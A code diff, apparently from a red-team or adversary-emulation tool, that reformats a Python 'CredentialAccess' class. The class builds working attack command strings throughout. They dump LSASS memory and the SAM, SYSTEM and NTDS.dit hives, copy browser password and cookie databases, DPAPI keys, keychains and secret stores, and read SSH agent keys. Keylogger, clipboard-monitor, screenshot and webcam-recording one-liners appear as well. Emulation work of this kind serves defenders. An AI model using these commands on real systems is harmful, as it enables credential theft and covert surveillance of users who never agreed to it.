@@ -272,7 +272,8 @@ class CredentialAccess:
                 elif method == "task_manager":
                     # Using Task Manager
                     result["details"]["command"] = (
-                        "Manual process: Open Task Manager > Details > lsass.exe > Right-click > Create dump file"
+                        "Manual process: Open Task Manager > Details > lsass.exe "
+                        "> Right-click > Create dump file"
                     )
                     result["details"]["technique_details"] = (
                         "Using Task Manager to create LSASS process dump"
@@ -281,9 +282,11 @@ class CredentialAccess:
                 elif method == "comsvcs":
                     # Using comsvcs.dll
                     lsass_pid = random.randint(700, 900)
-                    result["details"]["command"] = (
-                        f"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {lsass_pid} {output_path} full"
+                    comsvcs = (
+                        r"C:\Windows\System32\comsvcs.dll"
+                        f", MiniDump {lsass_pid} {output_path} full"
                     )
+                    result["details"]["command"] = f"rundll32.exe {comsvcs}"
                     result["details"]["technique_details"] = (
                         "Using comsvcs.dll MiniDump function to dump LSASS memory"
                     )
@@ -303,9 +306,11 @@ class CredentialAccess:
                 elif method == "werfault":
                     # Using WerFault.exe
                     lsass_pid = random.randint(700, 900)
-                    result["details"]["command"] = (
-                        f'tasklist /FI "IMAGENAME eq lsass.exe" && werfault.exe -pm {lsass_pid} -u {output_path} -s 0'
+                    fault_cmd = (
+                        f'tasklist /FI "IMAGENAME eq lsass.exe" && '
+                        f"werfault.exe -pm {lsass_pid} -u {output_path} -s 0"
                     )
+                    result["details"]["command"] = fault_cmd
                     result["details"]["technique_details"] = (
                         "Using Windows Error Reporting to dump LSASS memory"
                     )
@@ -376,7 +381,9 @@ class CredentialAccess:
                 if method == "registry":
                     # Using reg save command
                     result["details"]["command"] = (
-                        f"reg save HKLM\\SAM {output_dir}\\sam.save && reg save HKLM\\SYSTEM {output_dir}\\system.save && reg save HKLM\\SECURITY {output_dir}\\security.save"
+                        f"reg save HKLM\\SAM {output_dir}\\sam.save "
+                        f"&& reg save HKLM\\SYSTEM {output_dir}\\system.save "
+                        f"&& reg save HKLM\\SECURITY {output_dir}\\security.save"
                     )
                     result["details"]["technique_details"] = (
                         "Using reg save to extract SAM, SYSTEM, and SECURITY hives"
@@ -384,9 +391,12 @@ class CredentialAccess:
 
                 elif method == "volume_shadow":
                     # Using Volume Shadow Copy
-                    result["details"]["command"] = (
-                        f"wmic shadowcopy call create Volume='C:\\' && vssadmin list shadows && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[X]\\Windows\\System32\\config\\SAM {output_dir}\\sam.save"
+                    sam_from_shadow = (
+                        f"wmic shadowcopy call create Volume='C:\\' && vssadmin list shadows && "
+                        f"copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[X]"
+                        f"\\Windows\\System32\\config\\SAM {output_dir}\\sam.save"
                     )
+                    result["details"]["command"] = sam_from_shadow
                     result["details"]["technique_details"] = (
                         "Using Volume Shadow Copy Service to access SAM database"
                     )
@@ -394,7 +404,8 @@ class CredentialAccess:
                 elif method == "secretsdump":
                     # Using Impacket's secretsdump
                     result["details"]["command"] = (
-                        f"python secretsdump.py -sam {output_dir}\\sam.save -system {output_dir}\\system.save LOCAL"
+                        f"python secretsdump.py -sam {output_dir}\\sam.save "
+                        f"-system {output_dir}\\system.save LOCAL"
                     )
                     result["details"]["technique_details"] = (
                         "Using Impacket's secretsdump to extract and parse SAM database"
@@ -480,9 +491,14 @@ class CredentialAccess:
             if os.name == "nt":  # Windows
                 if method == "vssadmin":
                     # Using Volume Shadow Copy Service
-                    result["details"]["command"] = (
-                        f"vssadmin create shadow /for=C: && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[X]\\Windows\\NTDS\\NTDS.dit {output_dir}\\ntds.dit && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[X]\\Windows\\System32\\config\\SYSTEM {output_dir}\\system.save"
+                    vol = "\\Device\\HarddiskVolumeShadowCopy[X]"
+                    dit_path = (
+                        f"vssadmin create shadow /for=C: && "
+                        f"copy \\\\?\\GLOBALROOT{vol}\\Windows\\NTDS\\NTDS.dit "
+                        f"{output_dir}\\ntds.dit && copy \\\\?\\GLOBALROOT{vol}\\"
+                        f"Windows\\System32\\config\\SYSTEM {output_dir}\\system.save"
                     )
+                    result["details"]["command"] = dit_path
                     result["details"]["technique_details"] = (
                         "Using Volume Shadow Copy Service to extract NTDS.dit and SYSTEM hive"
                     )
@@ -498,18 +514,25 @@ class CredentialAccess:
 
                 elif method == "diskshadow":
                     # Using diskshadow
-                    result["details"]["command"] = (
-                        f'diskshadow /s:script.txt (where script.txt contains: set context persistent nowriters, add volume c: alias ntds, create, expose %ntds% z:, exec "cmd.exe /c copy z:\\Windows\\NTDS\\ntds.dit {output_dir}\\ntds.dit")'
+                    diskshadow_notes = (
+                        "diskshadow /s:script.txt (where script.txt contains: set context "
+                        "persistent nowriters, add volume c: alias ntds, create, expose "
+                        f'%ntds% z:, exec "cmd.exe /c copy z:\\Windows\\NTDS\\ntds.dit '
+                        f'{output_dir}\\ntds.dit")'
                     )
+                    result["details"]["command"] = diskshadow_notes
                     result["details"]["technique_details"] = (
                         "Using diskshadow to access and copy NTDS.dit"
                     )
 
                 elif method == "wmic":
                     # Using WMIC
-                    result["details"]["command"] = (
-                        f"wmic shadowcopy call create Volume='C:\\' && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[X]\\Windows\\NTDS\\NTDS.dit {output_dir}\\ntds.dit"
+                    ntds_from_shadow = (
+                        f"wmic shadowcopy call create Volume='C:\\' && "
+                        f"copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[X]"
+                        f"\\Windows\\NTDS\\NTDS.dit {output_dir}\\ntds.dit"
                     )
+                    result["details"]["command"] = ntds_from_shadow
                     result["details"]["technique_details"] = (
                         "Using WMIC to create shadow copy and extract NTDS.dit"
                     )
@@ -576,9 +599,9 @@ class CredentialAccess:
 
             # Define browser paths and files
             browser_paths = {
-                "chrome": "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default",
-                "firefox": "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
-                "edge": "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default",
+                "chrome": (r"C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default"),
+                "firefox": (r"C:\Users\%USERNAME%\AppData\Roaming\Mozilla\Firefox\Profiles"),
+                "edge": (r"C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default"),
                 "safari": (
                     "/Users/%USERNAME%/Library/Safari" if os.name != "nt" else "Not applicable"
                 ),
@@ -623,8 +646,9 @@ class CredentialAccess:
                 if browser_type in ["chrome", "edge"]:
                     # Chrome/Edge use similar storage mechanisms
                     if data_type == "logins" or data_type == "all":
+                        lf = files["logins"]
                         result["details"]["command"] = (
-                            f'copy "{browser_path}\\{files["logins"]}" "{output_dir}\\{browser_type}_logins.db"'
+                            f'copy "{browser_path}\\{lf}" "{output_dir}\\{browser_type}_logins.db"'
                         )
                         result["details"]["technique_details"] = (
                             f"Copying {browser_type} login database"
@@ -633,15 +657,17 @@ class CredentialAccess:
                             "SELECT origin_url, username_value, password_value FROM logins"
                         )
                     elif data_type == "cookies":
+                        cf = files["cookies"]
                         result["details"]["command"] = (
-                            f'copy "{browser_path}\\{files["cookies"]}" "{output_dir}\\{browser_type}_cookies.db"'
+                            f'copy "{browser_path}\\{cf}" "{output_dir}\\{browser_type}_cookies.db"'
                         )
                         result["details"]["technique_details"] = (
                             f"Copying {browser_type} cookies database"
                         )
                     elif data_type == "history":
+                        hf = files["history"]
                         result["details"]["command"] = (
-                            f'copy "{browser_path}\\{files["history"]}" "{output_dir}\\{browser_type}_history.db"'
+                            f'copy "{browser_path}\\{hf}" "{output_dir}\\{browser_type}_history.db"'
                         )
                         result["details"]["technique_details"] = (
                             f"Copying {browser_type} history database"
@@ -649,15 +675,19 @@ class CredentialAccess:
                 elif browser_type == "firefox":
                     # Firefox uses different storage
                     if data_type == "logins" or data_type == "all":
+                        lf_ff = files["logins"]
                         result["details"]["command"] = (
-                            f'FOR /D %i IN ("{browser_path}\\*") DO copy "%i\\{files["logins"]}" "{output_dir}\\firefox_logins.json"'
+                            f'FOR /D %i IN ("{browser_path}\\*") DO copy '
+                            f'"%i\\{lf_ff}" "{output_dir}\\firefox_logins.json"'
                         )
                         result["details"]["technique_details"] = (
                             "Copying Firefox login database from profiles"
                         )
                     elif data_type == "cookies":
+                        cf_ff = files["cookies"]
                         result["details"]["command"] = (
-                            f'FOR /D %i IN ("{browser_path}\\*") DO copy "%i\\{files["cookies"]}" "{output_dir}\\firefox_cookies.db"'
+                            f'FOR /D %i IN ("{browser_path}\\*") DO copy '
+                            f'"%i\\{cf_ff}" "{output_dir}\\firefox_cookies.db"'
                         )
                         result["details"]["technique_details"] = (
                             "Copying Firefox cookies database from profiles"
@@ -665,12 +695,14 @@ class CredentialAccess:
             else:  # Linux/Unix
                 if browser_type in ["chrome", "chromium"]:
                     result["details"]["command"] = (
-                        f"cp ~/.config/google-chrome/Default/Login\\ Data {output_dir}/chrome_logins.db"
+                        "cp ~/.config/google-chrome/Default/"
+                        f"Login\\ Data {output_dir}/chrome_logins.db"
                     )
                     result["details"]["technique_details"] = "Copying Chrome login database"
                 elif browser_type == "firefox":
                     result["details"]["command"] = (
-                        f"cp ~/.mozilla/firefox/*.default/logins.json {output_dir}/firefox_logins.json"
+                        "cp ~/.mozilla/firefox/*.default/logins.json "
+                        f"{output_dir}/firefox_logins.json"
                     )
                     result["details"]["technique_details"] = "Copying Firefox login database"
 
@@ -766,7 +798,8 @@ class CredentialAccess:
 
                     # Add PowerShell alternative
                     result["details"]["powershell_command"] = (
-                        f"powershell -command \"Get-StoredCredential | Export-Clixml '{output_dir}\\credentials.xml'\""
+                        "powershell -command "
+                        f"\"Get-StoredCredential | Export-Clixml '{output_dir}\\credentials.xml'\""
                     )
 
                     # Target credential types
@@ -778,8 +811,12 @@ class CredentialAccess:
 
                 elif keychain_type == "browser":
                     result["details"]["implementation"] = "Windows browser credential extraction"
+                    edge_lp = r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"
+                    chrome_lp = r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
                     result["details"]["command"] = (
-                        f'mkdir {output_dir} && copy "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data" {output_dir}\\edge_creds.db && copy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data" {output_dir}\\chrome_creds.db'
+                        f"mkdir {output_dir} "
+                        f'&& copy "{edge_lp}" {output_dir}\\edge_creds.db '
+                        f'&& copy "{chrome_lp}" {output_dir}\\chrome_creds.db'
                     )
                     result["details"]["technique_details"] = (
                         "Extract saved browser credentials from local storage"
@@ -794,7 +831,9 @@ class CredentialAccess:
                 elif keychain_type == "dpapi":
                     result["details"]["implementation"] = "DPAPI master key extraction"
                     result["details"]["command"] = (
-                        f'powershell -command "Copy-Item -Path $env:APPDATA\\Microsoft\\Protect -Destination {output_dir}\\DPAPI -Recurse"'
+                        "powershell -command "
+                        f'"Copy-Item -Path $env:APPDATA\\Microsoft\\Protect '
+                        f'-Destination {output_dir}\\DPAPI -Recurse"'
                     )
                     result["details"]["technique_details"] = (
                         "Extract DPAPI master keys and protected data"
@@ -818,16 +857,25 @@ class CredentialAccess:
                     )
 
                     # Add security tool commands
+                    login_kc = (
+                        f"security dump-keychain -d login.keychain "
+                        f"> {output_dir}/login_keychain.txt"
+                    )
+                    sys_kc = (
+                        f"security dump-keychain -d System.keychain "
+                        f"> {output_dir}/system_keychain.txt"
+                    )
                     result["details"]["keychain_commands"] = [
                         f"security list-keychains > {output_dir}/keychains.txt",
-                        f"security dump-keychain -d login.keychain > {output_dir}/login_keychain.txt",
-                        f"security dump-keychain -d System.keychain > {output_dir}/system_keychain.txt",
+                        login_kc,
+                        sys_kc,
                     ]
 
                 elif keychain_type == "browser" and sys.platform == "darwin":  # macOS browser
                     result["details"]["implementation"] = "macOS browser keychain extraction"
                     result["details"]["command"] = (
-                        f"security find-internet-password -g -a '*' > {output_dir}/browser_passwords.txt"
+                        f"security find-internet-password -g -a '*' "
+                        f"> {output_dir}/browser_passwords.txt"
                     )
                     result["details"]["technique_details"] = (
                         "Extract saved browser credentials from macOS Keychain"
@@ -835,8 +883,14 @@ class CredentialAccess:
 
                 elif sys.platform == "linux":  # Linux
                     result["details"]["implementation"] = "Linux secret service extraction"
+                    py_snip = (
+                        "import secretstorage; conn = secretstorage.dbus_init(); "
+                        "collection = secretstorage.get_default_collection(conn); "
+                        "for item in collection.get_all_items(): print(item.get_secret())"
+                    )
                     result["details"]["command"] = (
-                        f'mkdir -p {output_dir} && python3 -c "import secretstorage; conn = secretstorage.dbus_init(); collection = secretstorage.get_default_collection(conn); for item in collection.get_all_items(): print(item.get_secret())" > {output_dir}/secrets.txt'
+                        f'mkdir -p {output_dir} && python3 -c "{py_snip}" '
+                        f"> {output_dir}/secrets.txt"
                     )
                     result["details"]["technique_details"] = (
                         "Extract credentials from Linux Secret Service API"
@@ -862,10 +916,11 @@ class CredentialAccess:
                 # Generate appropriate credential details based on type
                 if cred_type == "password":
                     service_types = ["web", "email", "database", "ssh", "vpn", "application"]
+                    domains = ["company.com", "service.com", "provider.net"]
                     finding = {
                         "type": "password",
                         "service": random.choice(service_types),
-                        "username": f"user{random.randint(1, 100)}@{random.choice(['company.com', 'service.com', 'provider.net'])}",
+                        "username": (f"user{random.randint(1, 100)}@{random.choice(domains)}"),
                         "created": (
                             datetime.now() - timedelta(days=random.randint(0, 365))
                         ).isoformat(),
@@ -876,9 +931,11 @@ class CredentialAccess:
                         ),
                     }
                 elif cred_type == "certificate":
+                    role = random.choice(["user", "server", "client", "admin"])
+                    zone = random.choice(["company.com", "service.com", "local"])
                     finding = {
                         "type": "certificate",
-                        "subject": f"CN={random.choice(['user', 'server', 'client', 'admin'])}{random.randint(1, 100)}.{random.choice(['company.com', 'service.com', 'local'])}",
+                        "subject": f"CN={role}{random.randint(1, 100)}.{zone}",
                         "issuer": random.choice(
                             ["Internal CA", "DigiCert Inc", "Let's Encrypt", "Company Root CA"]
                         ),
@@ -981,7 +1038,10 @@ class CredentialAccess:
                     "%USERPROFILE%\\.ssh",
                     "C:\\Program Files\\OpenSSH\\etc",
                     "C:\\Program Files\\Git\\etc\\ssh",
-                    "%USERPROFILE%\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_*\\LocalState",
+                    (
+                        "%USERPROFILE%\\AppData\\Local\\Packages\\"
+                        "Microsoft.WindowsTerminal_*\\LocalState"
+                    ),
                     "%PROGRAMDATA%\\ssh",
                 ]
             else:  # Linux/Unix
@@ -1015,7 +1075,9 @@ class CredentialAccess:
                 # SSH agent manipulation
                 if os.name == "nt":  # Windows
                     result["details"]["command"] = (
-                        f'start /b ssh-agent && set > "{output_dir}\\agent_env.txt" && ssh-add -L > "{output_dir}\\ssh_keys.txt"'
+                        "start /b ssh-agent "
+                        f'&& set > "{output_dir}\\agent_env.txt" '
+                        f'&& ssh-add -L > "{output_dir}\\ssh_keys.txt"'
                     )
                     result["details"]["technique_details"] = "Extract keys from SSH agent cache"
                 else:  # Linux/Unix
@@ -1175,9 +1237,14 @@ class CredentialAccess:
                     result["details"]["implementation"] = (
                         "Python-based keyboard hook using pynput library"
                     )
-                    result["details"]["command"] = (
-                        f"python -c \"from pynput import keyboard; def on_press(key): with open('{output_path}', 'a') as f: f.write(str(key) + '\\n'); with keyboard.Listener(on_press=on_press) as listener: listener.join()\""
+                    _kl_body = (
+                        f"from pynput import keyboard; def on_press(key): "
+                        f"with open('{output_path}', 'a') as f: "
+                        "f.write(str(key) + '\\n'); "
+                        "with keyboard.Listener(on_press=on_press) as listener: "
+                        "listener.join()"
                     )
+                    result["details"]["command"] = f'python -c "{_kl_body}"'
                     result["details"]["hooks"] = ["SetWindowsHookEx", "GetAsyncKeyState"]
                     result["details"]["privileges"] = ["User level (no admin required)"]
                 else:  # Linux/Unix
@@ -1333,9 +1400,16 @@ class CredentialAccess:
                     result["details"]["implementation"] = (
                         "Periodic clipboard polling using Windows API"
                     )
-                    result["details"]["command"] = (
-                        f"python -c \"import time, win32clipboard, win32con; while True: win32clipboard.OpenClipboard(); data = win32clipboard.GetClipboardData(win32con.CF_TEXT) if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT) else b''; win32clipboard.CloseClipboard(); if data: open('{output_path}', 'ab').write(data + b'\\n---\\n'); time.sleep({interval})\""
+                    _clip_win = (
+                        "import time, win32clipboard, win32con; while True: "
+                        "win32clipboard.OpenClipboard(); "
+                        "data = win32clipboard.GetClipboardData(win32con.CF_TEXT) "
+                        "if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT) "
+                        "else b''; win32clipboard.CloseClipboard(); "
+                        f"if data: open('{output_path}', 'ab').write(data + b'\\n---\\n'); "
+                        f"time.sleep({interval})"
                     )
+                    result["details"]["command"] = f'python -c "{_clip_win}"'
                     result["details"]["polling_interval"] = f"{interval} seconds"
                     result["details"]["api_used"] = [
                         "OpenClipboard",
@@ -1369,9 +1443,14 @@ class CredentialAccess:
                     ]
             else:  # Linux/Unix
                 result["details"]["implementation"] = "X11 clipboard monitoring"
-                result["details"]["command"] = (
-                    f"python -c \"import time, subprocess; while True: data = subprocess.check_output(['xclip', '-selection', 'clipboard', '-o']); open('{output_path}', 'ab').write(data + b'\\n---\\n'); time.sleep(5)\""
+                _clip_x = (
+                    "import time, subprocess; while True: "
+                    "data = subprocess.check_output("
+                    "['xclip', '-selection', 'clipboard', '-o']); "
+                    f"open('{output_path}', 'ab').write(data + b'\\n---\\n'); "
+                    "time.sleep(5)"
                 )
+                result["details"]["command"] = f'python -c "{_clip_x}"'
                 result["details"]["dependencies"] = ["xclip"]
 
             # Process information
@@ -1489,16 +1568,30 @@ class CredentialAccess:
                     result["details"]["implementation"] = (
                         "Periodic screenshots using Python PIL/win32gui"
                     )
-                    result["details"]["command"] = (
-                        f"python -c \"import time, os, PIL.ImageGrab; os.makedirs('{output_dir}', exist_ok=True); start_time = time.time(); while time.time() - start_time < {duration}: img = PIL.ImageGrab.grab(); img.save('{output_dir}/screen_' + str(int(time.time())) + '.png'); time.sleep({interval})\""
+                    _shot_py = (
+                        "import time, os, PIL.ImageGrab; "
+                        f"os.makedirs('{output_dir}', exist_ok=True); "
+                        "start_time = time.time(); "
+                        f"while time.time() - start_time < {duration}: "
+                        "img = PIL.ImageGrab.grab(); "
+                        f"img.save('{output_dir}/screen_' + str(int(time.time())) + '.png'); "
+                        f"time.sleep({interval})"
                     )
+                    result["details"]["command"] = f'python -c "{_shot_py}"'
                     result["details"]["api_used"] = ["BitBlt", "CreateCompatibleDC"]
                     result["details"]["format"] = "PNG (lossless)"
                 else:  # Linux/Unix
                     result["details"]["implementation"] = "Screenshot capture using Python PIL/Xlib"
-                    result["details"]["command"] = (
-                        f"python -c \"import time, os, PIL.ImageGrab; os.makedirs('{output_dir}', exist_ok=True); start_time = time.time(); while time.time() - start_time < {duration}: img = PIL.ImageGrab.grab(); img.save('{output_dir}/screen_' + str(int(time.time())) + '.png'); time.sleep({interval})\""
+                    _shot_py_nix = (
+                        "import time, os, PIL.ImageGrab; "
+                        f"os.makedirs('{output_dir}', exist_ok=True); "
+                        "start_time = time.time(); "
+                        f"while time.time() - start_time < {duration}: "
+                        "img = PIL.ImageGrab.grab(); "
+                        f"img.save('{output_dir}/screen_' + str(int(time.time())) + '.png'); "
+                        f"time.sleep({interval})"
                     )
+                    result["details"]["command"] = f'python -c "{_shot_py_nix}"'
                     result["details"]["dependencies"] = ["python3-pil", "python3-xlib"]
                     result["details"]["format"] = "PNG (lossless)"
 
@@ -1507,15 +1600,32 @@ class CredentialAccess:
                 max_duration = min(duration, 300)  # Limit single video to 5 minutes
                 if os.name == "nt":  # Windows
                     result["details"]["implementation"] = "Video recording using Python OpenCV"
-                    result["details"]["command"] = (
-                        f"python -c \"import cv2, time, os; os.makedirs('{output_dir}', exist_ok=True); start_time = time.time(); while time.time() - start_time < {duration}: segment_start = time.time(); filename = '{output_dir}/video_' + str(int(segment_start)) + '.avi'; cap = cv2.VideoCapture(0); fourcc = cv2.VideoWriter_fourcc(*'XVID'); out = cv2.VideoWriter(filename, fourcc, 20.0, (1920, 1080)); segment_time = time.time(); while time.time() - segment_start < {max_duration} and time.time() - start_time < {duration}: ret, frame = cap.read(); if ret: out.write(frame); cap.release(); out.release(); time.sleep(1)\""
+                    _vid_py = (
+                        "import cv2, time, os; "
+                        f"os.makedirs('{output_dir}', exist_ok=True); "
+                        "start_time = time.time(); "
+                        f"while time.time() - start_time < {duration}: "
+                        "segment_start = time.time(); "
+                        f"filename = '{output_dir}/video_' + "
+                        "str(int(segment_start)) + '.avi'; "
+                        "cap = cv2.VideoCapture(0); "
+                        "fourcc = cv2.VideoWriter_fourcc(*'XVID'); "
+                        "out = cv2.VideoWriter(filename, fourcc, 20.0, (1920, 1080)); "
+                        f"while time.time() - segment_start < {max_duration} and "
+                        f"time.time() - start_time < {duration}: "
+                        "ret, frame = cap.read(); "
+                        "if ret: out.write(frame); "
+                        "cap.release(); out.release(); time.sleep(1)"
                     )
+                    result["details"]["command"] = f'python -c "{_vid_py}"'
                     result["details"]["api_used"] = ["DirectShow", "Media Foundation"]
                     result["details"]["format"] = "AVI (XVID compression)"
                 else:  # Linux/Unix
                     result["details"]["implementation"] = "Video recording using ffmpeg"
                     result["details"]["command"] = (
-                        f"for i in $(seq 1 $({duration}/{max_duration})); do ffmpeg -f x11grab -s 1920x1080 -i :0.0 -t {max_duration} {output_dir}/video_$(date +%s).mp4; done"
+                        f"for i in $(seq 1 $({duration}/{max_duration})); do "
+                        f"ffmpeg -f x11grab -s 1920x1080 -i :0.0 -t {max_duration} "
+                        f"{output_dir}/video_$(date +%s).mp4; done"
                     )
                     result["details"]["dependencies"] = ["ffmpeg"]
                     result["details"]["format"] = "MP4 (H.264 compression)"
